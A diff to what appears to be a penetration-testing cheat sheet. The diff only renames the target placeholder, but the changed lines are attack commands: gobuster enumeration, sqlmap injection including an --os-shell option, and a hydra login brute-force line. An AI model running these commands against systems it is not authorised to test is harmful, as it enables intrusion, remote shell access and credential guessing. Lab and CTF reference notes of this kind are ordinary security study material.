@@ -22,8 +22,8 @@
 
 - web directories and subdomains
 ```
-gobuster dir -u http://<target-ip> -w <wordlist> -x php,html
-gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
+gobuster dir -u http://<rhost> -w <wordlist> -x php,html
+gobuster vhost -u http://<rhost> -w <wordlist> --append-domain
 ```
 - ``/robots.txt`` and ``/sitemap.xml``
 - view source ``CTRL+U``
@@ -44,9 +44,9 @@ gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
 	```
 - sqlmap
   ```
-  sqlmap -u "http://<target-ip>" --forms
+  sqlmap -u "http://<rhost>" --forms
   sqlmap -r request.txt --level 5 --risk 3 --batch
-  sqlmap -u "http://<target-ip>" --os-shell
+  sqlmap -u "http://<rhost>" --os-shell
   ```
 
 ## Cross-Site-Scripting
@@ -175,5 +175,5 @@ wpscan --url <url> -U <users> -P <passwords> -t 50
 ## Brute Force Login
 
 ```
-hydra -L <users> -P <passwords> <target-ip> http-post-form "<path>:username=^USER^&password=^PASS^:<failure-string>"
+hydra -L <users> -P <passwords> <rhost> http-post-form "<path>:username=^USER^&password=^PASS^:<failure-string>"
 ```
